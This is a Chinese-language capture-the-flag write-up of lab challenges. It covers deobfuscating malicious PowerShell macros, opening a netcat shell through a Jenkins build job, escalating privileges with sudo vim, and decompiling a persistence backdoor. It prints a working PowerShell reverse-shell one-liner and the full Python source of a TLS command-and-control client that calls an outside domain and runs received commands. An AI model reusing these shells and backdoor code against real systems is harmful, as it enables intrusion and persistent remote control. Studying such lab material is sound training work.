<pre class="line-numbers language-none"><code class="language-none">$client &#x3D; New-Object System.Net.Sockets.TCPClient(&quot;192.0.2.132&quot;,443);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2  &#x3D; $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><code>get flag1</code></p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; a &#x3D; &quot;&quot;&quot;) &#39;x&#39;+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )431[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,&#39;tXj&#39;(ecALPER.)&#39;$&#39;,&#39;wqi&#39;(eCALPER.)&#39;;tX&#39;+&#39;jsc0d_d3lb4n3_0rc4m&#39;+&#39;&#123;g&#39;+&#39;a&#39;+&#39;lftXj &#39;+&#39;&#x3D;1_ga&#39;+&#39;lfwqi&#39;(&quot;,&#39;.&#39;, &#39;R&#39;+&#39;iGHTtOl&#39;+&#39;eft&#39; )&quot;&quot;&quot;
&gt;&gt;&gt; print(a[::-1])
) &#39;tfe&#39;+&#39;lOtTHGi&#39;+&#39;R&#39; ,&#39;.&#39;,&quot;(&#39;iqwfl&#39;+&#39;ag_1&#x3D;&#39;+&#39; jXtfl&#39;+&#39;a&#39;+&#39;g&#123;&#39;+&#39;m4cr0_3n4bl3d_d0csj&#39;+&#39;Xt;&#39;).REPLACe(&#39;iqw&#39;,&#39;$&#39;).REPLAce(&#39;jXt&#39;,[sTRInG][chAR]34) |&amp;( $sheLLiD[1]+$sHeLlID[134) |&amp;( $sheLLiD[1]+$sHeLlID[13]+&#39;x&#39; )
&gt;&gt;&gt;
flag&#123;m4cr0_3n4bl3d_d0cs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>get flag2</code></p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; a &#x3D; &quot;&quot;&quot; ) )63]Rahc[,&#39;raZ&#39;EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )&#39;;2&#39;+&#39;N&#39;+&#39;1&#39;+&#39;&#125;su0r3g&#39;+&#39;n4d_3r4&#39;+&#39;_2N1 &#x3D; 2_ga&#39;+&#39;lfr&#39;+&#39;aZ&#39;(( ( )&#39;&#39;niOj-&#39;x&#39;+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . &quot;  ) &quot;&quot;&quot;
&gt;&gt;&gt; print(a[::-1])
 )  &quot; . ( $vERBOsEpReFereNcE.toSTriNG()[1,3]+&#39;x&#39;-jOin&#39;&#39;) ( ((&#39;Za&#39;+&#39;rfl&#39;+&#39;ag_2 &#x3D; 1N2_&#39;+&#39;4r3_d4n&#39;+&#39;g3r0us&#125;&#39;+&#39;1&#39;+&#39;N&#39;+&#39;2;&#39;)  -cREplACe  ([chaR]49+[chaR]78+[chaR]50),[chaR]34 -RePlacE&#39;Zar&#39;,[chaR]36) )
&gt;&gt;&gt;
4r3_d4ng3r0us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>flag</code></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;m4cr0_3n4bl3d_d0cs_4r3_d4ng3r0us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Locked-outside"><a href="#Locked-outside" class="headerlink" title="Locked outside"></a>Locked outside</h3><pre class="line-numbers language-none"><code class="language-none">Based on the payload discovered, the employee’s computer was used to compromise a machine in our network.

We checked the machine and confirmed that we’ve lost SSH access to it.

Can you check if we can get the access back?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>给出的是个<code>ova</code>后缀名的镜像文件，先将这个靶机导入VMware。靶机镜像我存入百度网盘里面了，下面是链接：</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1qBF5ER6kBmBuqTLGbpAr0g 
提取码：e1ic <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>注意到改靶机开启的时候有下面的内容</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906215449810.png" alt></p>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">nmap -T4 -A -v 192.168.10.143<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-result" data-language="result"><code class="language-result">PORT     STATE SERVICE VERSION
21&#x2F;tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        21            129 Jun 22 09:50 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.10.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22&#x2F;tcp   open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)
|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)
|_  256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)
8080&#x2F;tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn&#39;t have a title (text&#x2F;html;charset&#x3D;utf-8).
| http-robots.txt: 1 disallowed entry 
|_&#x2F;
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-server-header: Jetty(9.4.39.v20210325)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>21号端口ftp服务开着，注意到下面的文件:</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906215922064.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none"># Jenkins Development Server
# This is a development server
# default credentials - ssh
# username: root
# password: alpine_r00t<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个用户名密码用在Jenkins后台密码不行，登不上，用<code>admin:admin</code>才登上。</p>
<p>登上去有个项目，然后config，然后</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906224151038.png" alt></p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">Jenkins:  nc -nlvp 4444 -e &#x2F;bin&#x2F;ash
Attacker: nc 192.168.10.143 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后Build Now就行了，查看之后shell已经建成了</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906232405853.png" alt></p>
<p>然后nc一下就拿到shell了</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210906232448923.png" alt></p>
<p>然后查看<code>/etc/ssh</code></p>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">ls &#x2F;etc&#x2F;ssh
moduli
ssh_config
ssh_host_dsa_key
ssh_host_dsa_key.pub
ssh_host_ecdsa_key
ssh_host_ecdsa_key.pub
ssh_host_ed25519_key
ssh_host_ed25519_key.pub
ssh_host_rsa_key
ssh_host_rsa_key.pub
sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>flag就在最后的<code>sshd_config</code>这个文件里面了</p>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">cat &#x2F;etc&#x2F;ssh&#x2F;sshd_config | grep flag
# flag&#123;r00t_l0gin_1s_1ns3cur3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="Changing-our-locks-and-dumping-old-keys"><a href="#Changing-our-locks-and-dumping-old-keys" class="headerlink" title="Changing our locks and dumping old keys"></a>Changing our locks and dumping old keys</h3><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo &#x2F;usr&#x2F;bin&#x2F;vim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Jinkens权限下可以使用上面的命令，vim编辑器下可以执行命令，就带来了一个间接的权限提升。</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908093425089.png" alt></p>
<p>然后他说是一个持续的后门任务，那就首先想到<code>crontab</code></p>
<pre class="line-numbers language-none"><code class="language-none">crontab -u root -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908093604318.png" alt="image-20210908093604318"></p>
<p>然后将这个文件cp到ftp的文件目录下方便我们查看下载</p>
<pre class="line-numbers language-none"><code class="language-none">$ find &#x2F; -name ftp
&#x2F;var&#x2F;lib&#x2F;ftp

$ cp &#x2F;bin&#x2F;stayalive &#x2F;var&#x2F;lib&#x2F;ftp

$ ls &#x2F;var&#x2F;lib&#x2F;ftp
note.txt
stayalive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这是一个pyc文件，我是用离线的反编译工具反编译了一下</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908100437220.png" alt></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># uncompyle6 version 3.7.4</span>
<span class="token comment"># Python bytecode 3.8 (3413)</span>
<span class="token comment"># Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]</span>
<span class="token comment"># Embedded file name: ./stayalive.py</span>
<span class="token comment"># Compiled at: 2021-06-24 23:00:26</span>
<span class="token comment"># Size of source mod 2**32: 2810 bytes</span>
<span class="token keyword">import</span> socket<span class="token punctuation">,</span> subprocess<span class="token punctuation">,</span> os<span class="token punctuation">,</span> ssl

<span class="token keyword">def</span> <span class="token function">sczsz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> c2domain
    <span class="token keyword">global</span> c2port
    <span class="token keyword">global</span> s
    <span class="token keyword">global</span> ssls
    <span class="token keyword">global</span> tt
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        tt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">266</span><span class="token punctuation">,</span> <span class="token number">273</span><span class="token punctuation">,</span> <span class="token number">292</span><span class="token punctuation">,</span> <span class="token number">310</span><span class="token punctuation">,</span> <span class="token number">319</span><span class="token punctuation">,</span> <span class="token number">337</span><span class="token punctuation">,</span> <span class="token number">354</span><span class="token punctuation">,</span> <span class="token number">357</span><span class="token punctuation">,</span> <span class="token number">366</span><span class="token punctuation">,</span> <span class="token number">377</span><span class="token punctuation">,</span> <span class="token number">385</span><span class="token punctuation">,</span> <span class="token number">414</span><span class="token punctuation">,</span> <span class="token number">418</span><span class="token punctuation">,</span> <span class="token number">421</span><span class="token punctuation">]</span>
        c2domain <span class="token operator">=</span> <span class="token string">'c2.m1cr0s0ft.hax'</span>
        c2port <span class="token operator">=</span> <span class="token number">64318</span>
        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
        ssls <span class="token operator">=</span> ssl<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> ssl_version<span class="token operator">=</span><span class="token punctuation">(</span>ssl<span class="token punctuation">.</span>PROTOCOL_TLSv1_2<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> OO00OOOO0O00O00OO<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'socket creation error: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>OO00OOOO0O00O00OO<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">finally</span><span class="token punctuation">:</span>
                OO00OOOO0O00O00OO <span class="token operator">=</span> <span class="token boolean">None</span>
                <span class="token keyword">del</span> OO00OOOO0O00O00OO

        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            OO00OOOO0O00O00OO <span class="token operator">=</span> <span class="token boolean">None</span>
            <span class="token keyword">del</span> OO00OOOO0O00O00OO


<span class="token keyword">def</span> <span class="token function">cscsz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        ssls<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>c2domain<span class="token punctuation">,</span> c2port<span class="token punctuation">)</span><span class="token punctuation">)</span>
        xbx <span class="token operator">=</span> <span class="token string">'--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga&#123;enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw&#125;6nCaf\t\t--- END PRIVATE KEY ---'</span>
        ssls<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>xbx<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> tt<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'>'</span> <span class="token operator">+</span> <span class="token string">' > '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error <span class="token keyword">as</span> O0OO000O0OO0000OO<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'socket conn error: '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>O0OO000O0OO0000OO<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">finally</span><span class="token punctuation">:</span>
                O0OO000O0OO0000OO <span class="token operator">=</span> <span class="token boolean">None</span>
                <span class="token keyword">del</span> O0OO000O0OO0000OO

        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            O0OO000O0OO0000OO <span class="token operator">=</span> <span class="token boolean">None</span>
            <span class="token keyword">del</span> O0OO000O0OO0000OO


<span class="token keyword">def</span> <span class="token function">zszszs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        O00OO000O00OOO0O0 <span class="token operator">=</span> ssls<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
        O00OO000O00OOO0O0 <span class="token operator">=</span> O00OO000O00OOO0O0<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'received '</span> <span class="token operator">+</span> O00OO000O00OOO0O0<span class="token punctuation">)</span>
        <span class="token keyword">if</span> O00OO000O00OOO0O0<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'cd'</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>O00OO000O00OOO0O0<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            ssls<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' > '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>O00OO000O00OOO0O0<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
                OO0000OO0O0000OO0 <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>O00OO000O00OOO0O0<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span><span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span><span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">,</span> stdin<span class="token operator">=</span><span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">)</span>
                O000000000O0OOO00 <span class="token operator">=</span> OO0000OO0O0000OO0<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> OO0000OO0O0000OO0<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                O0000O0O0OO0O0OO0 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>O000000000O0OOO00<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                ssls<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>O0000O0O0OO0O0OO0 <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' > '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>O0000O0O0OO0O0OO0<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>
                    OO0O00OOO00OO0OO0 <span class="token operator">=</span> <span class="token number">2</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    OO0O00OOO00OO0OO0 <span class="token operator">=</span> <span class="token number">0</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Sent: '</span> <span class="token operator">+</span> OO0O00OOO00OO0OO0 <span class="token operator">*</span> <span class="token string">'\n'</span> <span class="token operator">+</span> O0000O0O0OO0O0OO0<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> O00OO000O00OOO0O0<span class="token punctuation">:</span>
            <span class="token keyword">break</span>

    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sczsz<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cscsz<span class="token punctuation">(</span><span class="token punctuation">)</span>
    zszszs<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>解一下flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">xbx <span class="token operator">=</span> <span class="token string">'--- BEGIN PRIVATE KEY ---\t\tfCfnaEldanaKJdiga&#123;enDjsim28kgdblec2kjte47JmiecSJD42LJdkenJdra00bp\t\tcSbrdkeCisa4laXtfevdgAA5ochm1Quejd_i7tySu4tea8VcadrCcm9jvc34DnBkl\t\tvTkMtdLdte6Mgfd4Lmueoal6mlsuy3Voem_P2hun0jsfne3ndLu0de1jfrdNw9dje4\t\tcEudnmelop_5kneDf8pma3mdkiCoiw30meMmcrura2iN_suwk5kQmmeoA2mkljapod9\t\tcyXen2mtnFkl3uaEo7iuoriCd36unVec4kwjB3osduAs8idoN9iidMsp1JysWyd2\t\tudtm1eDemDciA3iljeCyenN8Moiu26aQiemCi9usjekL5CyejocuIe3yw&#125;6nCaf\t\t--- END PRIVATE KEY ---'</span>
tt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">203</span><span class="token punctuation">,</span> <span class="token number">207</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">236</span><span class="token punctuation">,</span> <span class="token number">239</span><span class="token punctuation">,</span> <span class="token number">245</span><span class="token punctuation">,</span> <span class="token number">260</span><span class="token punctuation">,</span> <span class="token number">266</span><span class="token punctuation">,</span> <span class="token number">273</span><span class="token punctuation">,</span> <span class="token number">292</span><span class="token punctuation">,</span> <span class="token number">310</span><span class="token punctuation">,</span> <span class="token number">319</span><span class="token punctuation">,</span> <span class="token number">337</span><span class="token punctuation">,</span> <span class="token number">354</span><span class="token punctuation">,</span> <span class="token number">357</span><span class="token punctuation">,</span> <span class="token number">366</span><span class="token punctuation">,</span> <span class="token number">377</span><span class="token punctuation">,</span> <span class="token number">385</span><span class="token punctuation">,</span> <span class="token number">414</span><span class="token punctuation">,</span> <span class="token number">418</span><span class="token punctuation">,</span> <span class="token number">421</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>xbx<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> tt<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># flag&#123;b4ckd00rs_4r3_us3ful_f0r_p3rs1st3nc3&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Know-your-enemy"><a href="#Know-your-enemy" class="headerlink" title="Know your enemy"></a>Know your enemy</h3><p>这题的在线环境没有了，但是我看着wp还是挺简单的，这里就不再复现了。</p>
<h3 id="Blue-team-becomes-Red-Team"><a href="#Blue-team-becomes-Red-Team" class="headerlink" title="Blue team becomes Red Team"></a>Blue team becomes Red Team</h3><p>下面开始是另一个系列，这道题目的附件我也放在了百度网盘里面了，自取。</p>
<pre class="line-numbers language-none"><code class="language-none">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1xRyrZlthS4tmuJbctKnf6Q 
提取码：fsrb <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>首先配置网络</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210908152806811.png" alt></p>
<p>用nmap扫描一下看看</p>
<pre class="line-numbers language-none"><code class="language-none">PORT   STATE SERVICE VERSION
22&#x2F;tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)
|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)
|_  256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)
80&#x2F;tcp open  http    Node.js Express framework
|_http-title: Hyperion Group - Coming Soon
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
6379&#x2F;tcp open  redis   Redis key-value store 6.0.14<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看看80端口的web服务，没有发现什么值得一提的漏洞什么的，只是一个简单的html的界面，那就直接看后面的6379端口的Redis服务。</p>
<p><strong>Redis无密码 未授权访问</strong></p>
<p>先使用<code>Redis-cli.exe</code>做一下Redis的登录。</p>
<pre class="line-numbers language-none"><code class="language-none">redis-cli.exe -h 192.168.10.144 -p 6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
